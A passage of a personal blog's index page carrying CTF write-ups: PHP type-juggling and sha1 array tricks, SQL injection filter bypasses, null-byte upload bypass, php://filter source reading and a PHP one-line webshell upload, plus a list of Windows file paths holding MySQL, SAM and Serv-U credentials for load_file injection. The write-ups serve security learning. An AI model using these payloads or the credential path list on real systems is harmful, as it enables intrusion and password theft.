<!DOCTYPE html>












  


<html class="theme-next muse use-motion" lang="">
<head><meta name="generator" content="Hexo 3.9.0">
  <meta charset="UTF-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">






















<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css?v=4.7.0">

<link rel="stylesheet" href="/css/main.css?v=7.2.0">


  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=7.2.0">


  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=7.2.0">


  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=7.2.0">


  <link rel="mask-icon" href="/images/logo.svg?v=7.2.0" color="#222">







<script id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '/',
    scheme: 'Muse',
    version: '7.2.0',
    sidebar: {"position":"left","display":"post","offset":12,"onmobile":false},
    back2top: {"enable":true,"sidebar":false,"scrollpercent":false},
    copycode: {"enable":false,"show_result":false,"style":null},
    fancybox: false,
    fastclick: false,
    lazyload: false,
    tabs: true,
    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
    algolia: {
      applicationID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    },
    translation: {
      copy_button: 'Kopieren',
      copy_success: 'Kopiert',
      copy_failure: 'Kopieren fehlgeschlagen'
    }
  };
</script>

  <meta name="keywords" content="root">
<meta property="og:type" content="website">
<meta property="og:title" content="The clown is laughing at you">
<meta property="og:url" content="http://yoursite.com/page/7/index.html">
<meta property="og:site_name" content="The clown is laughing at you">
<meta property="og:locale" content="default">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="The clown is laughing at you">





  
  
  <link rel="canonical" href="http://yoursite.com/page/7/">



<script id="page.configurations">
  CONFIG.page = {
    sidebar: "",
  };
</script>

  
  <title>The clown is laughing at you</title>
  












  <noscript>
  <style>
  .use-motion .motion-element,
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-title { opacity: initial; }

  .use-motion .logo,
  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope="" itemtype="http://schema.org/WebPage" lang="default">

  
  
    
  

  <div class="container sidebar-position-left 
  page-home">
    <div class="headband"></div>

    <header id="header" class="header" itemscope="" itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-wrapper">
  <div class="site-meta">
    

    <div class="custom-logo-site-title">
      <a href="/" class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">The clown is laughing at you</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
    
    
  </div>

  <div class="site-nav-toggle">
    <button aria-label="Navigationsleiste an/ausschalten">
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
    </button>
  </div>
</div>



<nav class="site-nav">
  
    <ul id="menu" class="menu">
      
        
        
        
          
          <li class="menu-item menu-item-home">

    
    
      
    

    

    <a href="/" rel="section"><i class="menu-item-icon fa fa-fw fa-home"></i> <br>Startseite</a>

  </li>
        
        
        
          
          <li class="menu-item menu-item-archives">

    
    
      
    

    

    <a href="/archives/" rel="section"><i class="menu-item-icon fa fa-fw fa-archive"></i> <br>Archiv</a>

  </li>

      
      
    </ul>
  

  
    

  

  
</nav>



</div>
    </header>

    


    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          
          <div id="content" class="content">
            
  <section id="posts" class="posts-expand">
    
      

  

  
  
  

  

  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/02/18/几道实验吧的web题/">

    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
      <meta itemprop="name" content="cookie">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="The clown is laughing at you">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                
                <a href="/2019/02/18/几道实验吧的web题/" class="post-title-link" itemprop="url">几道实验吧的web题</a>
              
            
          </h1>
        

        <div class="post-meta">

          
          
          

          
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Veröffentlicht am</span>
              

              
                
              

              <time title="Erstellt: 2019-02-18 20:15:10 / Geändert am: 20:18:48" itemprop="dateCreated datePublished" datetime="2019-02-18T20:15:10+08:00">2019-02-18</time>
            </span>
          

          
            

            
          

          

          
            
            
          

          
          

          

          

          <br>
          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p>做了几道实验吧的web题，在这里分享一下</p>
<p>然后顺便复习一下，几道题有有很多sql注入的题，然后让我深知我水平完全不够，还有很多要学的。</p>
<p><strong>0x01 你真的会php吗？</strong></p>
<p>打开后，查看http报文头的信息，然后发现里面有txt文件，打开<br><img src="/2019/02/18/几道实验吧的web题/1.png" alt="1"><br>里面是一段源码。</p>
<p> 审计原代码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$info = &quot;&quot;; </span><br><span class="line">$req = [];</span><br><span class="line">$flag=&quot;xxxxxxxxxx&quot;;</span><br><span class="line"></span><br><span class="line">ini_set(&quot;display_error&quot;, false); </span><br><span class="line">error_reporting(0); </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if(!isset($_POST[&apos;number&apos;]))&#123; #提交的变量是否为number</span><br><span class="line">   header(&quot;hint:6c525af4059b4fe7d8c33a.txt&quot;);</span><br><span class="line"></span><br><span class="line">   die(&quot;have a fun!!&quot;); </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">foreach([$_POST] as $global_var) &#123; </span><br><span class="line">    foreach($global_var as $key =&gt; $value) &#123; #遍历提交的数据 </span><br><span class="line">        $value = trim($value);#去除提交字符串两边的空格还有约定符号 </span><br><span class="line">        is_string($value) &amp;&amp; $req[$key] = addslashes($value); </span><br><span class="line">    &#125; </span><br><span class="line">&#125; #判断提交数据是否为字符串，并且储存在req中。</span><br><span class="line"></span><br><span class="line">#判断是否为回文字符串</span><br><span class="line">function is_palindrome_number($number) &#123; </span><br><span class="line">    $number = strval($number); </span><br><span class="line">    $i = 0; </span><br><span class="line">    $j = strlen($number) - 1; </span><br><span class="line">    while($i &lt; $j) &#123; </span><br><span class="line">        if($number[$i] !== $number[$j]) &#123; </span><br><span class="line">            return false; </span><br><span class="line">        &#125; </span><br><span class="line">        $i++; </span><br><span class="line">        $j--; </span><br><span class="line">    &#125; </span><br><span class="line">    return true; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if(is_numeric($_REQUEST[&apos;number&apos;]))&#123;</span><br><span class="line">    </span><br><span class="line">   $info=&quot;sorry, you cann&apos;t input a number!&quot;;#输入的不能为纯数字</span><br><span class="line"></span><br><span class="line">&#125;else if($req[&apos;number&apos;]!=strval(intval($req[&apos;number&apos;])))&#123;#提交的数值和取整后的数值必须相同</span><br><span class="line">      </span><br><span class="line">     $info = &quot;number must be equal to it&apos;s integer!! &quot;;  </span><br><span class="line"></span><br><span class="line">&#125;else&#123;</span><br><span class="line"></span><br><span class="line">     $value1 = intval($req[&quot;number&quot;]);#vaule1为取整后的数值</span><br><span class="line">     $value2 = intval(strrev($req[&quot;number&quot;]));#value2为反转后的数值  </span><br><span class="line"></span><br><span class="line">     if($value1!=$value2)&#123;#判断两个数值是否相同</span><br><span class="line">          $info=&quot;no, this is not a palindrome number!&quot;;</span><br><span class="line">     &#125;else&#123;</span><br><span class="line">          </span><br><span class="line">          if(is_palindrome_number($req[&quot;number&quot;]))&#123;#调用方法 is_palindrome_number() 来判断是否为回文数字，比如121就得不到回文数字</span><br><span class="line">              $info = &quot;nice! &#123;$value1&#125; is a palindrome number!&quot;; </span><br><span class="line">          &#125;else&#123;</span><br><span class="line">             $info=$flag;</span><br><span class="line">          &#125;</span><br><span class="line">     &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">echo $info;</span><br></pre></td></tr></table></figure></p>
<p>然后就想到?number=0e0%00,联系之前bugku的矛盾一题。<br>然后就可以先试一试，发现不可以<br><img src="/2019/02/18/几道实验吧的web题/2.png" alt="2"><br>看了别人的writeup<br>改成了：0e-0%00，然后就能返回出flag,因为0e0%00是回文，那么问题来了，为什么0e-0%00或者0e+0%00就可以，这是因为xey：x倍的10的y次方。这下就好理解了。<br><img src="/2019/02/18/几道实验吧的web题/3.png" alt="3"></p>
<p><strong>0x02 FALSE</strong><br><img src="/2019/02/18/几道实验吧的web题/4.png" alt="4"><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if (isset($_GET[&apos;name&apos;]) and isset($_GET[&apos;password&apos;])) &#123;</span><br><span class="line">    if ($_GET[&apos;name&apos;] == $_GET[&apos;password&apos;])</span><br><span class="line">        echo &apos;&lt;p&gt;Your password can not be your name!&lt;/p&gt;&apos;;</span><br><span class="line">    else if (sha1($_GET[&apos;name&apos;]) === sha1($_GET[&apos;password&apos;]))</span><br><span class="line">      die(&apos;Flag: &apos;.$flag);</span><br><span class="line">    else</span><br><span class="line">        echo &apos;&lt;p&gt;Invalid password.&lt;/p&gt;&apos;;</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">	echo &apos;&lt;p&gt;Login first!&lt;/p&gt;&apos;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
<p>然后这道题，我觉得很有必要理解一下==和===的差别：</p>
<p>这要说到php代码是弱类型的语言，如类型的语言可以把数字和字符串做比较，例 123==“123” ？</p>
<p>在php中这一类的比较是属于弱类型的比较，使用2个等于号，仅仅比较两个的值，一看都是123 ，便返回相等</p>
<p>而3个等于号是全方位的比较等号两边的‘东西’ 不仅仅比较值得大小，数据的类型也算入其内了，例123===“123” ，这就是错的，会返回false</p>
<p>这里我觉得有两种解法，一个是sha1碰撞，一个是通过sha1()函数的漏洞<br>第一种解法我就直接挂上大佬的writeup:<a href="http://www.shiyanbar.com/ctf/writeup/4512" target="_blank" rel="noopener">http://www.shiyanbar.com/ctf/writeup/4512</a></p>
<p>然后第二种解法是sha1()中存在着一种漏洞，无法对数组进行处理,那就直接构造URL<br>    <code>http://ctf5.shiyanbar.com/web/false.php?name=123&amp;password=456</code><br><img src="/2019/02/18/几道实验吧的web题/5.png" alt="5"><br>然后我们修改这段url<br>    <code>http://ctf5.shiyanbar.com/web/false.php?name[]=123&amp;password[]=456</code><br>得到flag<br><img src="/2019/02/18/几道实验吧的web题/6.png" alt="6"></p>
<p><strong>0x03 简单的sql注入　１－３</strong></p>
<p>简单的sql注入１：<br>先挂上万能注入的payload<br>    <code>1&#39; or &#39;1&#39;=&#39;1&#39;</code><br><img src="/2019/02/18/几道实验吧的web题/7.png" alt="7"><br>可以想到sql语句为单引号闭合形式<br>    <code>select * from * where post=&#39;###&#39;</code><br>然后再尝试<br>    <code>1&#39; or &#39;1&#39;=&#39;1</code></p>
<p>发现or没有被过滤，那我们就再试试别的。在burp中可以模糊注入一下，看看其他的关键词是否被过滤<br>然后发现几乎都被过滤了</p>
<p>然后尝试一下<br>    <code>1 union or</code><br>然后发现　union　不见了。<br>    <code>1 unionunion or</code><br>实际上发现空格也被吞掉了，现在知道了过滤机制是什么，构造payload,还要关注单引号闭合<br>    <code>1&#39; unionunion  selectselect  database() &#39;</code><br>发现是可以的，然后挂上我的payload,爆表名：<br>    <code>1&#39; unionunion  selectselect  table_name  fromfrom  information_schema.tables  wherewhere  table_schtable_schemaema=database() andand  &#39;1&#39;=&#39;1</code></p>
<p>爆字段名：<br>    <code>1&#39; unionunion  selectselect  column_namcolumn_namee  fromfrom  information_scheminformation_schema.columnsa.columns  wherewhere  table_name=&#39;flag</code><br><strong>这里，我觉得有一点值得关注，就是要巧用单引号闭合</strong></p>
<p>爆出flag:<br>    <code>1&#39;unionunion  selectselect  flag  fromfrom  flag  wherewhere  &#39;1&#39;=&#39;1</code></p>
<p>仔细想一下，发现好像过滤机制自己搞错了，好像过滤掉后面带空格的关键字，所以我们要想个办法绕过空格，+、%0a、%0b、/<strong>/……　这里使用/</strong>/<br>所以payload可以为下面这样：<br>   <code>1&#39;/**/union/**/select/**/flag/**/from/**/flag/**/where/**/&#39;1&#39;=&#39;1</code></p>
<p>简单的sql注入２：<br>这道题，纯属运气，在第一题的基础上，我尝试了一下，发现空格会被过滤掉，然后有些字符也被过滤掉<br>我尝试了一下’union’,’select’,’union select’,’union/<strong>/‘,’union/</strong>/select’,’union/<strong>/select/</strong>/‘<br>然后得出了用/<strong>/绕过的法子，看了一下大佬的writeup，难得自己对了一次.<br>payload:<br>`1’/</strong>/union/<strong>/select/</strong>/flag/<strong>/from/</strong>/flag/<strong>/where/</strong>/‘1’=’1`</p>
<p>简单的sql注入３：<br>这道题暂时先留着，因为不知道为什么sqlmap不会用，可把我气死了。<br>估计是什么东西没有安装好，等开学请教同学。</p>
<p><strong>0x04 上传绕过</strong><br>这道题和南邮的一道CTF题简直一模一样，<br>这里放上一个博主的文章，关于00截断的一些见解，我觉得还蛮有用的<br><a href="https://blog.csdn.net/zpy1998zpy/article/details/80545408" target="_blank" rel="noopener">https://blog.csdn.net/zpy1998zpy/article/details/80545408</a></p>
<p>考点：00截断<br>然后我们这题<br><img src="/2019/02/18/几道实验吧的web题/8.png" alt="几道实验吧的web题/7.png"><br>因为只允许上传jpg,png等图片格式文件，然后我用图片一句话木马，然后上传后抓包修改图片文件名，连上蚁剑，找flag,发现我错了，然后评论里说用00截断<br>上网找了00截断的资料。</p>
<p>所以我想多了。</p>
<p>首先上传一个jpg文件，抓包，放入repeater.<br><img src="/2019/02/18/几道实验吧的web题/9.png" alt="几道实验吧的web题/7.png"><br>提示：<br><img src="/2019/02/18/几道实验吧的web题/10.png" alt="几道实验吧的web题/7.png"><br>又要上传的是图片文件，又要有php做后缀。<br>所以这里有双重验证，客户端一次验证，服务器端一次验证。<br>文件基本要是 xx.phpxx.jpg</p>
<p>所以有00截断的思路，一个图片文件在客户端验证的过程中为jpg文件，然后到服务器时又为php文件，我们使用00截断，在文件的路径上进行添加文件后缀名<br>获得flag<br><img src="/2019/02/18/几道实验吧的web题/11.png" alt="几道实验吧的web题/7.png"><br><img src="/2019/02/18/几道实验吧的web题/12.png" alt="几道实验吧的web题/7.png"></p>
<p>上面文章中有一题00截断的php代码分析题，我觉得还不错<br><img src="/2019/02/18/几道实验吧的web题/13.png" alt="几道实验吧的web题/7.png"></p>
<p>这道题正确的payload是:<br><code>?nctf=1%00%23biubiubiu</code><br>因为是url编码所以把 # 改成了 %23</p>

          
        
      
    </div>

    

    

    
    
    

    

    
      
    
    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  

  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/02/08/BUGKU-WEB/">

    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
      <meta itemprop="name" content="cookie">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="The clown is laughing at you">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                
                <a href="/2019/02/08/BUGKU-WEB/" class="post-title-link" itemprop="url">BUGKU-WEB</a>
              
            
          </h1>
        

        <div class="post-meta">

          
          
          

          
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Veröffentlicht am</span>
              

              
                
              

              <time title="Erstellt: 2019-02-08 08:59:58" itemprop="dateCreated datePublished" datetime="2019-02-08T08:59:58+08:00">2019-02-08</time>
            </span>
          

          
            

            
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="fa fa-calendar-check-o"></i>
                </span>
                
                  <span class="post-meta-item-text">Bearbeitet am</span>
                
                <time title="Geändert am: 2019-05-15 19:36:51" itemprop="dateModified" datetime="2019-05-15T19:36:51+08:00">2019-05-15</time>
              </span>
            
          

          

          
            
            
          

          
          

          

          

          <br>
          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p><strong>秋名山老司机</strong><br>这道题，刷新页面会发现算式是在变的，<br><img src="/2019/02/08/BUGKU-WEB/1.png" alt="1"><br>所以我就想到写一个脚本，来跑这个算式，然后post一个结果上去，脚本代码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import re</span><br><span class="line">url=&apos;http://123.206.87.240:8002/qiumingshan/&apos;</span><br><span class="line">s=requests.Session()</span><br><span class="line">source = s.get(url)</span><br><span class="line">source.encoding=source.apparent_encoding</span><br><span class="line">print source.text</span><br><span class="line">expression = re.search(r&apos;(\d+[+\-*])+(\d+)&apos;, source.text).group()</span><br><span class="line">result = eval(expression)</span><br><span class="line">post=&#123;&apos;value&apos;:result&#125;</span><br><span class="line">print &quot;-------------------------&quot;</span><br><span class="line">print&#123;s.post(url,data=post).text&#125;</span><br></pre></td></tr></table></figure></p>
<p>我最初的代码没有用到Session（）的知识点，因为不懂，后来看了一些文章，略懂一二,附上文章：<br><a href="https://www.cnblogs.com/lonelydreamer/p/6169469.html" target="_blank" rel="noopener">https://www.cnblogs.com/lonelydreamer/p/6169469.html</a><br><a href="https://blog.csdn.net/jyh_jack/article/details/82457953" target="_blank" rel="noopener">https://blog.csdn.net/jyh_jack/article/details/82457953</a><br><a href="https://www.jb51.net/article/127159.htm" target="_blank" rel="noopener">https://www.jb51.net/article/127159.htm</a><br>附上使用了Session对象后的代码。</p>
<p>然后跑出的结果是这样的<br><img src="/2019/02/08/BUGKU-WEB/2.png" alt="1"></p>
<p><strong>速度要快</strong><br>和秋名山这题很想，查看源码它说要post一个margin上去，一脸懵逼，然后用burp的repeater走一下，发现在header中有flag<br><img src="/2019/02/08/BUGKU-WEB/3.png" alt="1"><br>base64编码过的，以为是flag,吃亏了，后来想了一下，题目要我们post一个margin，所以我又试着将flag解码一下，果然出数字了。<br><img src="/2019/02/08/BUGKU-WEB/4.png" alt="1"><br>然后就开始写脚本了。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"># coding=UTF-8</span><br><span class="line">import requests</span><br><span class="line">import base64</span><br><span class="line">url = &apos;http://123.206.87.240:8002/web6/&apos;</span><br><span class="line">target=requests.Session()</span><br><span class="line">header=target.get(url).headers</span><br><span class="line">flag=header[&apos;flag&apos;]</span><br><span class="line">print flag</span><br><span class="line"></span><br><span class="line">#对flag解码</span><br><span class="line">txt=base64.b64decode(flag)</span><br><span class="line">print txt</span><br><span class="line"></span><br><span class="line">#截取flag,值得学习的一行代码</span><br><span class="line">txt = txt[txt.index(&quot;:&quot;)+2:]</span><br><span class="line">print txt</span><br><span class="line"></span><br><span class="line">#题目要求我们要post一个margin值（int型的值），那么我们获取的flag值实际上还是base64的密文，所以再解码一次</span><br><span class="line">txt=base64.b64decode(txt)</span><br><span class="line">print txt</span><br><span class="line"></span><br><span class="line">post=&#123;&apos;margin&apos;:txt&#125;</span><br><span class="line">print &quot;-------------------------&quot;</span><br><span class="line">print&#123;target.post(url,data=post).text&#125;</span><br></pre></td></tr></table></figure></p>
<p><strong>矛盾</strong><br>先看源代码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$num=$_GET[&apos;num&apos;];</span><br><span class="line">if(!is_numeric($num))</span><br><span class="line">&#123;</span><br><span class="line">echo $num;</span><br><span class="line">if($num==1)</span><br><span class="line">echo &apos;flag&#123;**********&#125;&apos;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>这就很奇怪的就是，要在num不等于1的情况下，输出num=1，才可以获取flag<br>所以这时候就能想到科学计数法<br>?num=1<em>e</em>0.1<br>x<em>e</em>y:x倍的10的y次方</p>
<p><strong>变量1</strong><br><img src="/2019/02/08/BUGKU-WEB/5.png" alt="1"><br>这里的flag1.php文件中存有flag,然后在变量args中进行正则表达式的匹配，变量args是否是字符串，<br>最后的一段代码<br>    <code>eval(&quot;var_dump($$args);&quot;);</code><br>这里了解到php中变量可以作为另一个变量的变量名；<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$a=&apos;b&apos;;</span><br><span class="line">$b=&quot;Boogle&quot;;</span><br><span class="line">eval(&quot;var_dump($$a);&quot;);//输出   Boogle</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
<p>这里$$a可以看成$($a),也就是$b.<br>同样的$args可以为某个变量名，这里想到：$GLOBALS：一个包含了全部变量的全局组合数组。<br>所以构造payload为：?args=GLOBALS<br>爆出所有的变量，就能获得flag</p>
<p><strong>flag在index里</strong><br>这道题我是真的不会，然后看了一些博主的文章，附上博主的文章：<br><a href="https://blog.csdn.net/wy_97/article/details/77431111" target="_blank" rel="noopener">https://blog.csdn.net/wy_97/article/details/77431111</a><br><a href="https://blog.csdn.net/wy_97/article/details/77432002" target="_blank" rel="noopener">https://blog.csdn.net/wy_97/article/details/77432002</a></p>
<p><img src="/2019/02/08/BUGKU-WEB/6.png" alt="1"><br>查看源码，然后发现无从下手，看了大佬的文章知道了，可以使用php://filter</p>
<p>php://filter之前最常出镜的地方是XXE。由于XXE漏洞的特殊性，我们在读取HTML、PHP等文件时可能会抛出此类错误parser error : StartTag: invalid element name 。其原因是，PHP是基于标签的脚本语言，&lt;?php … ?&gt;这个语法也与XML相符合，所以在解析XML的时候会被误认为是XML，而其中内容（比如特殊字符）又有可能和标准XML冲突，所以导致了出错。</p>
<p>所以传参：php://filter/read=convert.base64-encode/resource=index.php<br>这样子我们在burp的repeater中获取到被base64加密的字段，解码一下，就能获取flag<br>这道题考察的是文件包含漏洞</p>
<p><strong>成绩表</strong><br>这道题是典型的sql注入的题<br>在burp中抓包后，在repeater模块中，<br>有id这一项，然后想到可能是sql注入，然后先到数据有四个表放着姓名，还有三科成绩，然后尝试<br>？id=-1’ order by 4–+ 失败，然后尝试<br>？id=-1’ union select 1,2,3,database() –+结果成功了，<br><img src="/2019/02/08/BUGKU-WEB/7.png" alt="1"><br>然后就顺风顺水<br><img src="/2019/02/08/BUGKU-WEB/8.png" alt="1"><br><img src="/2019/02/08/BUGKU-WEB/9.png" alt="1"><br><img src="/2019/02/08/BUGKU-WEB/10.png" alt="1"></p>
<p><strong>文件包含2</strong><br>写这道题的意义在于，我觉得这道题值得思考<br>这道题考察文件包含漏洞，文件上传漏洞，考察burp的使用<br><img src="/2019/02/08/BUGKU-WEB/11.png" alt="1"></p>
<p>然后绕过<br>上传一句话木马<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script language=php&gt;system(<span class="string">"ls"</span>)&lt;/script&gt;</span><br></pre></td></tr></table></figure></p>
<p>修改文件名为：1.php:.jpg<br>文件类型为：image/jpeg</p>
<p>绕过成功后，访问我们上传的文件，读目录，然后读flag的文件。</p>

          
        
      
    </div>

    

    

    
    
    

    

    
      
    
    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  

  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/01/31/mysql注入常见load-file路径/">

    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
      <meta itemprop="name" content="cookie">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="The clown is laughing at you">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                
                <a href="/2019/01/31/mysql注入常见load-file路径/" class="post-title-link" itemprop="url">mysql注入常见load_file路径</a>
              
            
          </h1>
        

        <div class="post-meta">

          
          
          

          
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Veröffentlicht am</span>
              

              
                
              

              <time title="Erstellt: 2019-01-31 16:34:18 / Geändert am: 16:35:24" itemprop="dateCreated datePublished" datetime="2019-01-31T16:34:18+08:00">2019-01-31</time>
            </span>
          

          
            

            
          

          

          
            
            
          

          
          

          

          

          <br>
          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p>WINDOWS下:<br>c:/boot.ini //查看系统版本</p>
<p>c:/windows/php.ini //php配置信息</p>
<p>c:/windows/my.ini //MYSQL配置文件，记录管理员登陆过的MYSQL用户名和密码</p>
<p>c:/winnt/php.ini</p>
<p>c:/winnt/my.ini</p>
<p>c:\mysql\data\mysql\user.MYD //存储了mysql.user表中的数据库连接密码</p>
<p>c:\Program Files\RhinoSoft.com\Serv-U\ServUDaemon.ini //存储了虚拟主机网站路径和密码</p>
<p>c:\Program Files\Serv-U\ServUDaemon.ini</p>
<p>c:\windows\system32\inetsrv\MetaBase.xml 查看IIS的虚拟主机配置</p>
<p>c:\windows\repair\sam //存储了WINDOWS系统初次安装的密码</p>
<p>c:\Program Files\ Serv-U\ServUAdmin.exe //6.0版本以前的serv-u管理员密码存储于此</p>
<p>c:\Program Files\RhinoSoft.com\ServUDaemon.exe</p>
<p>C:\Documents and Settings\All Users\Application Data\Symantec\pcAnywhere*.cif文件</p>
<p>//存储了pcAnywhere的登陆密码</p>
